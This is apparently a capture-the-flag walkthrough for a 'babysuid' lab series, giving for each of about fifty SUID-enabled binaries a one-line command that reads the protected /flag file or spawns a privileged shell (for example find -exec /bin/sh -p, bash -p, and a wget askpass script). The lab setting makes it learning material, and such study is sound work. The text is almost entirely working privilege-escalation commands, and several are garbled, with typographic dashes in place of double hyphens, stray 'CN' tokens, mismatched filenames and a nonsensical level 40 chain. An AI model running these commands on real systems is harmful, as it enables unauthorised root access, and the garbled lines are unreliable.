
Level 1 — If SUID bit on /usr/bin/cat


cat /flag

Level 2: If SUID bit on /usr/bin/more


more /flag

Level 3: If SUID bit on /usr/bin/less


less /flag

Level 4: If SUID bit on /usr/bin/head


head /flag

Level 5: If SUID bit on /usr/bin/tail


tail /flag

Level 6: If SUID bit on /usr/bin/sort


sort /flag

Level 7: If SUID bit on /usr/bin/vim


vim /flag

Level 8: If SUID bit on /usr/bin/emacs


emacs /flag
p

Level 9: If SUID bit on /usr/bin/nano


nano /flag

Level 10: If SUID bit on /usr/bin/rev


rev /flag | rev

Level 11: If SUID bit on /usr/bin/od


od /flag

Level 12: If SUID bit on /usr/bin/hd


hd /flag

Level 13: If SUID bit on /usr/bin/xxd


xxd /flag

Level 14: If SUID bit on /usr/bin/base32


base32 /flag | base32 -d

Level 15: If SUID bit on /usr/bin/base64


base64 /flag | base64 -d

Level 16: If SUID bit on /usr/bin/split


split /flag
ls
cat FILENAME_THAT_IS_GENERATED

Level 17: If SUID bit on /usr/bin/gzip


gzip -c /flag | gzip -d

Level 18: If SUID bit on /usr/bin/bzip2


bzip2 -c /flag | bzip2 -d

Level 19: If SUID bit on /usr/bin/zip


zip flag.zip /flag && cat flag.zip

Level 20: If SUID bit on /usr/bin/tar


tar -cf flag.tar /flag && cat flag.tar

Level 21: If SUID bit on /usr/bin/ar


F=$(mktemp -u) && ar r “$F” /flag && cat “$F”

Level 22: If SUID bit on /usr/bin/cpio


find /flag | cpio -o > flag.cpioio && cat flag.cpio

Level 23: If SUID bit on /usr/bin/genisoimage


genisoimage -sort /flag

Level 24: If SUID bit on /usr/bin/env


env cat /flag

Level 25: If SUID bit on /usr/bin/find


find . -exec /bin/sh -p \; 
cat /flag

Level 26: If SUID bit on /usr/bin/make


make -s — eval=$’x:\n\t-’”cat /flag”

Level 27: If SUID bit on /usr/bin/nice


nice cat /flag

Level 28: If SUID bit on /usr/bin/timeout


timeout 1 cat /flag

Level 29: If SUID bit on /usr/bin/stdbuf


stdbuf -i0 cat /flag

Level 30: If SUID bit on /usr/bin/setarch


setarch $(arch) cat /flag

Level 31: If SUID bit on /usr/bin/watch


watch -x cat /flag

Level 32: If SUID bit on /usr/bin/socat


socat -u /flag -

Level 33: If SUID bit on /usr/bin/whiptail


whiptail — textbox /flag 10 30

Level 34: If SUID bit on /usr/bin/awk


awk “//” /flag

Level 35: If SUID bit on /usr/bin/sed


sed ‘’ /flag

Level 36: If SUID bit on /usr/bin/ed


ed /flag CN

#Then type p to print flag and q to quit

Level 37: If SUID bit on /usr/bin/chown


chown hacker /flag && cat /flag

Level 38: If SUID bit on /usr/bin/chmod


chmod 666 /flag && cat /flag 

Level 39: If SUID bit on /usr/bin/cp


cp — no-preserve=all /flag . && cat flag

Level 40: If SUID bit on /usr/bin/mv



mv /usr/bin/cat /usr/bin/mv || ./challenge/babysuid_level40 || mv /flag | grep pwn.college{

Level 41: If SUID bit on /usr/bin/perl


perl -pe ‘END { close ARGV }’ /flag

Level 42: If SUID bit on /usr/bin/python

You can also try to write a program that reads the content of the /flag file.

python /flag

Level 43: If SUID bit on /usr/bin/ruby


echo “puts File.read(‘/flag’)” >> a.rb && ruby a.rb CN

Level 44: If SUID bit on /usr/bin/bash


bash -p CN then cat /flag

Level 45: If SUID bit on /usr/bin/date


date -f /flag 

Level 46: If SUID bit on /usr/bin/dmesg


dmesg -F /flag 

Level 47: If SUID bit on /usr/bin/wc


wc — files0-from=/flag

Level 48: If SUID bit on /usr/bin/gcc


gcc -x c -E /flag 

Level 49: If SUID bit on /usr/bin/as


as /flag 

Level 50: If SUID bit on /usr/bin/wget

This command creates a temporary executable script file using mktemp, sets execute permissions, and writes a simple shell script into it. The script is designed to execute /bin/sh with a specific set of options. Finally, it uses wget to download a file, passing the created script as the askpass program, allowing for potential privilege escalation or unauthorized access.

Then we can read the /flag file using cat /flag

F=$(mktemp) && chmod +x $F && echo -e ‘#!/bin/sh -p\n/bin/sh -p 1>&0’ >$F && wget — use-askpass=$F 0
cat /flag

Level 51: If SUID bit on /usr/bin/ssh-agent
